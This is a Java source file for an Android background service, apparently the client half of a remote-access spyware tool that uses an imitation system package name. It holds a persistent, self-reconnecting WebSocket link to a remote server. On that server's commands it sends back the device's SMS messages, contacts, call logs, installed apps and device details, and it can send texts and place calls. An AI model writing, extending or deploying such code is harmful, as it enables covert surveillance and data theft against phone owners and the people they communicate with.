package com.android.controller;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import com.android.controller.functionalities.ContactAndCallLogUtil;
import com.android.controller.functionalities.DeviceInformationFetcher;
import com.android.controller.functionalities.SMSReader;
import com.android.controller.functionalities.VolumeController;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.URI;
import java.net.URISyntaxException;
import java.text.ParseException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import tech.gusavila92.websocketclient.WebSocketClient;

public class WebSocketService extends Service {
    private String webSocketURI;
    private WebSocketClient webSocketClient;
    private JSONObject requestString;
    private String command, sender;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        webSocketURI = intent.getStringExtra("webSocketURI");
        createConnection();

        // Return START_STICKY to restart the service if it gets terminated
        return START_STICKY;
    }

    private void createConnection() {
        URI uri;
        try {
            // Connect to WebSocket URI
            uri = new URI(webSocketURI);
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return;
        }

        webSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen() {
                // Handle connection opened
                Log.d("WebSocket", "Connection established");
            }

            @Override
            public void onTextReceived(String request) {
                try {
                    Log.d("WebSocket", "Message received");
                    requestString = new JSONObject(request);
                    command = requestString.getString("cmd");
                    sender = requestString.getString("sender");
                    if (sender.equals("SERVER")) {
                        String result = evaluateRequest(command);
                        if (result != null) {
                            webSocketClient.send(result);
                            Log.d("WebSocket", "Message sent");
                        }
                    } else {
                        // Handle messages from non-SERVER senders if needed
                    }
                } catch (JSONException | ParseException e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onBinaryReceived(byte[] data) {
            }

            @Override
            public void onPingReceived(byte[] data) {
            }

            @Override
            public void onPongReceived(byte[] data) {
            }

            @Override
            public void onException(Exception e) {
                Log.e("WebSocket", "Exception: " + e.getMessage());
                try {
                    createConnection();
                }
                catch (Exception e2){
                    Log.d("WebSocket error",e.toString());
                }

            }

            @Override
            public void onCloseReceived() {
                Log.i("WebSocket", "Closed");
                // Handle WebSocket closure

//                reconnectWebSocket(); // Auto-reconnect
            }
        };
        webSocketClient.setConnectTimeout(10000);
        webSocketClient.setReadTimeout(60000);
        webSocketClient.enableAutomaticReconnection(5000); // Lowered to 5 seconds
        webSocketClient.connect();
    }

    private String evaluateRequest(String command) throws JSONException, ParseException {
        JSONObject jsonObject = new JSONObject();

        if (command != null) {
            DeviceInformationFetcher deviceInformationFetcher = new DeviceInformationFetcher(this.getApplicationContext());
            if (command.contains("DEVICE_DETAILS")) {
                return deviceInformationFetcher.getBasicDetails();
            } else if (command.contains("INSTALLED_APPS")) {
                return deviceInformationFetcher.getAllApps();
            } else if (command.contains("VIBRATE")) {
                return deviceInformationFetcher.vibrate(command);
            } else if (command.contains("MAKE_CALL")) {
                try {
                    deviceInformationFetcher.makePhoneCall(command);
                    JSONObject jsonObject1 = new JSONObject();
                    jsonObject1.put("ACK", "PLACED");
                    return jsonObject1.toString();
                } catch (Exception e) {
                    Log.d("WebSocket", e.toString());
                    return (jsonObject.put("Error", e.toString())).toString();
                }
            } else if (command.contains("GET_MESSAGES")) {
                SMSReader smsReader = new SMSReader(this.getApplicationContext());
                return smsReader.readSMS(command);
            } else if (command.contains("SEND_MESSAGE")) {
                SMSReader smsReader = new SMSReader(this.getApplicationContext());
                return smsReader.sendSMS(command);

            } else if (command.contains("OPEN_APP")) {
                return deviceInformationFetcher.openApp(command);

            } else if (command.contains("VOLUME")) {
                VolumeController volumeController = new VolumeController(this.getApplicationContext());
                return volumeController.audioManager(command);


            } else if (command.contains("GET_CONTACTS")) {
                ContactAndCallLogUtil contactAndCallLogUtil = new ContactAndCallLogUtil(this.getApplicationContext());
                return contactAndCallLogUtil.getAllContacts();
            } else if (command.contains("GET_CALL_LOGS")) {
                ContactAndCallLogUtil contactAndCallLogUtil = new ContactAndCallLogUtil(this.getApplicationContext());
                return contactAndCallLogUtil.getAllCallLogs();
            } else {
                jsonObject.put("Error", "Unknown Command");
                return jsonObject.toString();
            }
        } else {
            jsonObject.put("Error", "Unknown Command");
            return jsonObject.toString();
        }
    }

    private void reconnectWebSocket() {
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
        executor.schedule(() -> {
            // Reconnect if the WebSocket is not open
            createConnection();
        }, 5, TimeUnit.SECONDS);
    }
}
